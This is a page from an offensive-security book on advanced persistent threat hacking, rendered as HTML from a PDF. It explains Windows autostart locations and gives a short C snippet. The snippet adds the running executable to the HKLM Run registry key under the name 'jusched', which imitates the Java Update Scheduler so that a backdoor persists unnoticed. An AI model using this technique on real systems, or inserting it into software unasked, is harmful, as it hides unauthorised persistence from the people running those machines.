<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1af" class="pf w2 h2" data-page-no="1af"><div class="pc pc1af w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">408<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">The v<span class="_ _0"/>ast majority of autostart locations are actually stored in the registry<span class="_ _2"/>. Even </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">most autostart folders and scheduled tasks are stored within the registry<span class="_ _3"/>. Some </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">examples of common autostart locations include the follo<span class="_ _0"/>wing:</div><div class="t m0 x16 h1f yc63 ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 hd yc64 ff4 fs7 fc0 sc0 ls0 ws18">Scheduled T<span class="_ _3"/>asks</div><div class="t m0 x16 h1f yc65 ffb fse fc0 sc0 ls0 ws18">c</div><div class="t m0 x1 hd yc66 ff4 fs7 fc0 sc0 ls0 ws0">Autostart Folders</div><div class="t m0 x16 h1f yc67 ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 hd yc68 ff4 fs7 fc0 sc0 ls0 ws0">Registry Locations (e.g., Run, RunOnce, and RunServices)</div><div class="t m0 x3 h7 y26c1 ff1 fs3 fc0 sc0 ls0 ws0">Autostart: Registry</div><div class="t m0 x3 hd y26c2 ff4 fs7 fc0 sc0 ls0 ws0">Conguring registry entries within our program is a simple task, as sho<span class="_ _0"/>wn in the </div><div class="t m0 x3 hd y26c3 ff4 fs7 fc0 sc0 ls0 ws0">follo<span class="_ _0"/>wing example. It may seem odd to use the Re<span class="_ _0"/>gCreateKe<span class="_ _0"/>y function, but if the </div><div class="t m0 x3 hd y26c4 ff4 fs7 fc0 sc0 ls0 ws0">destination ke<span class="_ _0"/>y already exists, then the function simply opens the e<span class="_ _0"/>xisting key<span class="_ _3"/>. W<span class="_ _3"/>e </div><div class="t m0 x3 hd y26c5 ff4 fs7 fc0 sc0 ls0 ws0">then use RegSetV<span class="_ _1b"/>alueEx to set the v<span class="_ _0"/>alue for the key<span class="_ _3"/>.</div><div class="t m0 x3 h40 y26c6 fff fs5 fc0 sc0 ls0 ws0">#define AUTORUN_HIVE HKEY_LOCAL_MACHINE</div><div class="t m0 x3 h40 y26c7 fff fs5 fc0 sc0 ls0 ws0">#define AUTORUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"</div><div class="t m0 x3 h40 y26c8 fff fs5 fc0 sc0 ls0 ws0">#define AUTORUN_KEY_NAME "jusched"</div><div class="t m0 x3 h40 y26c9 fff fs5 fc0 sc0 ls0 ws0">--- SNIP ---</div><div class="t m0 x3 h40 y26ca fff fs5 fc0 sc0 ls0 ws0">int MAXPATH = 255;</div><div class="t m0 x3 h40 y26cb fff fs5 fc0 sc0 ls0 ws0">TCHAR exePath[MAXPATH];</div><div class="t m0 x3 h40 y26cc fff fs5 fc0 sc0 ls0 ws0">GetModuleFileName(0, exePath, MAXPATH);  // returns full path and filename</div><div class="t m0 x3 h40 y26cd fff fs5 fc0 sc0 ls0 ws0">int reg_key;</div><div class="t m0 x3 h40 y26ce fff fs5 fc0 sc0 ls0 ws0">HKEY hkey;</div><div class="t m0 x3 h40 y26cf fff fs5 fc0 sc0 ls0 ws0">reg_key=RegCreateKey(AUTORUN_HIVE,AUTORUN_KEY,&amp;hkey);</div><div class="t m0 x3 h40 y26d0 fff fs5 fc0 sc0 ls0 ws0">RegSetValueEx((HKEY)hkey, AUTORUN_KEY_NAME ,0,REG_SZ,(BYTE*)</div><div class="t m0 x3 h40 y26d1 fff fs5 fc0 sc0 ls0 ws0">exePath,strlen(exePath));</div><div class="t m0 x4 hd y26d2 ff4 fs7 fc0 sc0 ls0 ws0">In this example, we rst use the GetModuleFileName function, which gi<span class="_ _0"/>v<span class="_ _0"/>es us </div><div class="t m0 x3 hd y26d3 ff4 fs7 fc0 sc0 ls0 ws0">the full path and name of the running ex<span class="_ _0"/>ecutable—for example, C:\innocent\not_a_</div><div class="t m0 x3 hd y26d4 ff4 fs7 fc0 sc0 ls0 ws0">backdoor<span class="_ _2"/>.exe. <span class="_ _0"/>W<span class="_ _3"/>e then use this value in the call to Re<span class="_ _0"/>gSetV<span class="_ _1b"/>alueEx to create a key </div><div class="t m0 x3 hd y26d5 ff4 fs7 fc0 sc0 ls0 ws0">“jusched,<span class="_ _2"/>” which is a key created for the Ja<span class="_ _0"/>v<span class="_ _0"/>a Update Scheduler<span class="_ _2"/>.</div><div class="t m0 x4 hd y26d6 ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou’ll also note the call to RegCreateK<span class="_ _0"/>ey in which we specify both the hi<span class="_ _0"/>v<span class="_ _0"/>e and </div><div class="t m0 x3 h9b y26d7 ff4 fs7 fc0 sc0 ls0 ws0">the ke<span class="_ _0"/>y we wish to open, in this case <span class="fff fs13">HKEY_LOCAL_MACHINE\\SOFTWARE\\</span></div><div class="t m0 x3 h9b y26d8 fff fs13 fc0 sc0 ls0 ws0">Microsoft\\Windows\\CurrentVersion\\Run <span class="ff4">is the ultimate ke<span class="_ _0"/>y<span class="_ _2"/>, a very </span></div><div class="t m0 x3 h9c y26d9 ff4 fs13 fc0 sc0 ls0 ws0">common location for automatically starting ex<span class="_ _0"/>ecutables.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>